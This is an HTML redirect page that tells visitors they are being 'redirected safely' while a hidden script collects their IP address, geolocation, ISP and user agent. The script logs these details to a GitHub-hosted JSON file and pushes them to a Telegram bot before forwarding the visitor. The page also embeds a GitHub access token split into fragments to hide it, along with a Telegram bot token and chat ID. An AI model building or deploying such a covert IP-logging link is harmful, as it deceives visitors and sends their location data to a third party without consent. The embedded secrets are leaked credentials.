<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: #0f172a;
      color: #94a3b8;
      text-align: center;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid rgba(255,255,255,0.1);
      border-top-color: #38bdf8;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div>
    <div class="spinner"></div>
    <p>Redirecting you safely...</p>
  </div>

  <script>
    // --- GITHUB CONFIG ---
    const GITHUB_TOKEN = ["ghp_", "9gyyMMfQ2o4g", "cn5KTvDWR6uDF", "Flwr04XOLEE"].join("");
    const GITHUB_USER = "teamaryanvip";
    const GITHUB_REPO = "link-tracker";
    const FILE_PATH = "data.json";

    // --- TELEGRAM CONFIG ---
    const TG_BOT_TOKEN = "8765942325:AAEgmfMZDj6z9wfaiuuSpPq9i4EmIDbh9oc";
    const TG_CHAT_ID = "8044009916";

    // Helper: Fetch IP & Geolocation info with timeout
    async function getGeoInfo() {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 1800);
        const res = await fetch("https://ipwho.is/", { signal: controller.signal });
        clearTimeout(timeout);
        const geo = await res.json();
        if (geo && geo.success) {
          return {
            ip: geo.ip || "Unknown",
            country: geo.country || "Unknown",
            country_code: geo.country_code || "",
            flag: geo.flag ? geo.flag.emoji : "🌐",
            city: geo.city || "Unknown",
            isp: geo.connection ? geo.connection.isp : "Unknown"
          };
        }
      } catch (e) {}
      return { ip: "Unknown", country: "Unknown", country_code: "", flag: "🌐", city: "Unknown", isp: "Unknown" };
    }

    async function sendTelegramAlert(linkId, targetUrl, totalClicks, geo) {
      try {
        const timeNow = new Date().toLocaleString();
        const message = 
          `🚀 *New Click Detected!*\n\n` +
          `🔗 *Link:* \`${linkId}\`\n` +
          `🎯 *Target:* ${targetUrl}\n` +
          `📊 *Total Clicks:* ${totalClicks}\n` +
          `📍 *Location:* ${geo.flag} ${geo.city}, ${geo.country}\n` +
          `📡 *IP Address:* \`${geo.ip}\`\n` +
          `🏢 *ISP:* ${geo.isp}\n` +
          `⏰ *Time:* ${timeNow}`;

        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });
      } catch (e) {
        console.error(e);
      }
    }

    async function handleTracking() {
      const urlParams = new URLSearchParams(window.location.search);
      const linkId = urlParams.get("id");
      if (!linkId) return;

      const apiUrl = `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${FILE_PATH}`;

      try {
        // Fetch Geo info & GitHub contents simultaneously
        const [geo, res] = await Promise.all([
          getGeoInfo(),
          fetch(apiUrl, {
            headers: {
              "Authorization": `token ${GITHUB_TOKEN}`,
              "Accept": "application/vnd.github.v3+json"
            }
          })
        ]);

        if (!res.ok) throw new Error("Could not fetch data.json");

        const fileData = await res.json();
        const cleanBase64 = fileData.content.replace(/\s/g, '');
        const decodedContent = decodeURIComponent(escape(atob(cleanBase64)));
        const data = JSON.parse(decodedContent);

        if (data.links && data.links[linkId]) {
          const item = data.links[linkId];
          item.clicks = (item.clicks || 0) + 1;
          if (!item.logs) item.logs = [];

          // Add comprehensive log
          item.logs.push({
            time: new Date().toISOString(),
            ip: geo.ip,
            country: geo.country,
            country_code: geo.country_code,
            flag: geo.flag,
            city: geo.city,
            isp: geo.isp,
            userAgent: navigator.userAgent
          });

          // Keep max last 200 logs to prevent file bloating
          if (item.logs.length > 200) item.logs.shift();

          const updatedJson = JSON.stringify(data, null, 2);
          const encodedContent = btoa(unescape(encodeURIComponent(updatedJson)));

          const savePromise = fetch(apiUrl, {
            method: "PUT",
            headers: {
              "Authorization": `token ${GITHUB_TOKEN}`,
              "Content-Type": "application/json",
              "Accept": "application/vnd.github.v3+json"
            },
            body: JSON.stringify({
              message: `Click from ${geo.flag} ${geo.country} for ${linkId}`,
              content: encodedContent,
              sha: fileData.sha
            })
          });

          const tgPromise = sendTelegramAlert(linkId, item.target_url, item.clicks, geo);

          await Promise.all([savePromise, tgPromise]);
          window.location.replace(item.target_url);
        }
      } catch (err) {
        console.error(err);
      }
    }

    handleTracking();
  </script>
</body>
</html>
